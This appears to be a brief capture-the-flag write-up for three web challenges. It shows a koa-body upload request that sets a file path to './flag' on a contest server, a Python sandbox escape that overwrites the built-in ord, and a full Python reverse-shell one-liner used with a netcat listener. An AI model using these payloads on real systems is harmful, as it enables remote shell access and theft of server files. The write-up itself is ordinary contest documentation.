# Web

## CloudDisk

```
https://github.com/dlau/koa-body/issues/75

http://120.79.1.217:7777/uploadfile

{
	"files": {
		"file": {
			"name": "jankincai",
			"path": "./flag"
		}
	}
}

Upload success ~, your fileId is here：3484b276cc6038b0378ddcf65880b04f

http://120.79.1.217:7777/downloadfile/3484b276cc6038b0378ddcf65880b04f
```

## pysandbox

1. 生成字符集

```python
ss = 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

vlist = []

for v in ss:
    if v not in vlist:
        print(v * 50, end="")
        vlist.append(v)


```

2. 覆盖ord

```python
cmd = '__builtins__.__dict__[ord.__name__]=request.authorization.username.count'
```

3. 反弹shell

服务器：nc -lvvp port

```python
cmd = 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

4. 获取flag

```bash
cat flag
```

## pysandbox2

前三步和pysandbox一样

4. 获取flag

```bash
cd /
./readflag
```